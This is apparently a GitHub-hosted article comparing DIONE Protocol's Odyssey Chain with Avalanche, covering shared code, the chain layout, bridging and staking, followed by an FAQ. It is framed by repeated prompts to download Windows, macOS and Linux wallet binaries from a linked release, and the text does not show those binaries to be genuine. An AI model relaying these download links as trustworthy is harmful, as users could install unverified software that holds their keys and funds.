![DIONE Wallet](assets/banner-article.png)

# DIONE Protocol vs Avalanche

<p align="center">Relatives, not rivals</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Odyssey Chain is built on Avalanche's stack: the EVM comes from Coreth, the consensus derives from Avalanche's, and the three-chain architecture follows the same pattern. That makes DIONE Protocol and Avalanche relatives rather than rivals, and the differences are about purpose and scope rather than about mechanism.

## What "built on Avalanche" means here

Three specific borrowings, each verifiable:

- **The EVM.** Odyssey's contract layer runs Coreth, the same Ethereum Virtual Machine implementation Avalanche's C-Chain uses. Solidity contracts, ABIs and EVM tooling work without modification.
- **The consensus.** Odyssey's agreement mechanism derives from Avalanche's, which is a family of protocols rather than a single algorithm.
- **The architecture.** Responsibilities are split across chains - Delta for assets, Alpha for trading, Omega for contracts - which is Avalanche's three-chain idea applied to a dedicated network.

What that buys is maturity. Building an EVM chain from scratch means reimplementing and re-auditing things that already work; adopting a proven stack means the novel work happens at the application layer instead.

## Is DIONE Protocol a fork of Avalanche?

Yes, in the technical sense that the codebase descends from Avalanche's, and the description is not a marketing comparison - Coreth is named as the EVM and the consensus is described as Avalanche-derived.

What it is not is a copy of Avalanche's network. Odyssey has its own chain ID, 153153, its own RPC endpoint, its own validators, its own token and its own staking programme. A fork shares ancestry; it does not share state.

That distinction matters practically: an address that holds value on Avalanche holds nothing on Odyssey, and vice versa, even though both are EVM chains where the address looks identical.

## The three chains, side by side

| Role | Odyssey Chain | Avalanche equivalent |
| --- | --- | --- |
| Assets | Delta | X-Chain |
| Trading | Alpha | no single equivalent |
| Contracts | Omega, via Coreth | C-Chain, via Coreth |

The mapping is not exact, and it is not meant to be: Odyssey has arranged the same division of labour around its own purposes. What a developer gets is the familiar separation between the chain that holds value, the chain that coordinates, and the chain that runs contracts.

For a user, the visible consequence is simpler: your transactions happen on the contract chain, and gas is paid in DIONE.

## Can you move tokens between Avalanche and Odyssey?

Not with Avalanche's own bridge, and not by sending to an address. Moving value between the two networks means a bridge that supports both sides - Wanchain is the route the project names - and a bridge produces a wrapped representation rather than converting the asset.

Three things to get right before trying:

- **Gas on both sides**, or the arrival cannot move.
- **A small test transfer first**, because the gap between source and destination confirmation is where transfers go wrong.
- **The correct asset**: native DIONE, ERC-20 DIONE and wrapped forms are three different things.

[Bridge DIONE to Odyssey Chain With Wanchain](https://github.com/dione-protocol/keys-and-transfers/blob/main/bridge-dione-to-odyssey-with-wanchain.md) covers the mechanics, and [Migrate DIONE From ERC-20 to Odyssey Chain](https://github.com/dione-protocol/keys-and-transfers/blob/main/migrate-dione-from-erc20-to-odyssey.md) the one-time conversion that is often confused with bridging.

## Is DIONE competing with Avalanche?

In the narrow sense, no: Odyssey runs on Avalanche's stack, so Avalanche succeeding is not a threat to it. A chain that borrows a codebase is not in a race with the codebase's origin.

In the broader sense, every chain competes for the same scarce things - developers, applications, users and fees - and a dedicated network has to justify itself against the general-purpose alternative. Odyssey's justification is focus: a chain aimed at energy and infrastructure applications, with its own fee market rather than a share of someone else's.

Whether that focus is worth a separate chain is a judgement, and the honest version of it depends on whether the applications arrive. [Nebra Energy Trading on DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/nebra-energy-trading-on-dione.md) is the concrete case, and [Is DIONE Protocol a DePIN Project?](https://github.com/dione-protocol/staking-and-network/blob/main/is-dione-protocol-a-depin-project.md) the wider question.

## What a user actually notices

Four differences, in the order people encounter them:

**The chain ID.** 153153 rather than Avalanche's, so a wallet has to be told which network it is on.

**The token.** DIONE rather than AVAX, and fees are paid in it.

**The staking programme.** 10,000 DIONE minimum, a 1% base reward per 30-day period with an 8% annual maximum, a 10-day unbonding period and an early-exit penalty - terms specific to this chain.

**The ecosystem.** Applications built for Odyssey rather than for Avalanche's subnets, with the energy marketplace as the flagship example.

Everything else - the address format, the transaction model, the tooling - is what an EVM user already knows.

## Choosing between them

For a developer, the question is whether the EVM is enough or whether the ecosystem matters. An application that needs nothing but contracts can deploy anywhere EVM runs; one that needs the energy marketplace, the OBOL validator economy or the DIONE asset has a reason to be here.

For a holder, the question is what the asset is for. DIONE pays for an energy-focused chain's blockspace; AVAX pays for Avalanche's. Neither is a better version of the other.

## Where the comparison stops being useful

Mechanism only takes you so far. Past that, the questions are about execution: does the chain stay up, do validators behave, do applications get used. That is true of both networks, and no architecture comparison answers it.

The chain has run since November 2024, which is enough history to check uptime and block production on the explorer rather than argue from design. [How Odyssey Chain Powers DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/how-odyssey-chain-powers-dione.md) sets out the identifiers you need to do that.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Wallets are where a network choice becomes visible, and a build that is behind can be missing a network definition or a staking view. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before concluding the chain behaves unexpectedly.

## FAQ

### Is DIONE Protocol a fork of Avalanche?

Technically yes: the EVM is Coreth and the consensus derives from Avalanche's. It is a separate network with its own chain ID, validators and token.

### Can I move tokens between Avalanche and Odyssey?

Not by sending to an address and not with Avalanche's bridge. Use a bridge that supports both sides, with gas on each and a small test first.

### Is DIONE Protocol competing with Avalanche?

Not in mechanism, since it builds on Avalanche's stack. It does compete for the same developers and applications, on the strength of its focus.

### What is different for a user?

The chain ID, the fee token, the staking terms and the ecosystem. Addresses, transactions and tooling are ordinary EVM.

### Does Avalanche's C-Chain code work on Odyssey?

Yes. The EVM is Coreth, so Solidity contracts and EVM tooling apply without modification.

Sharing a stack with Avalanche removes most of the technical argument and leaves the interesting one: what the chain is for. That case is the energy marketplace in [Nebra Energy Trading on DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/nebra-energy-trading-on-dione.md) and the DePIN question in [Is DIONE Protocol a DePIN Project?](https://github.com/dione-protocol/staking-and-network/blob/main/is-dione-protocol-a-depin-project.md).
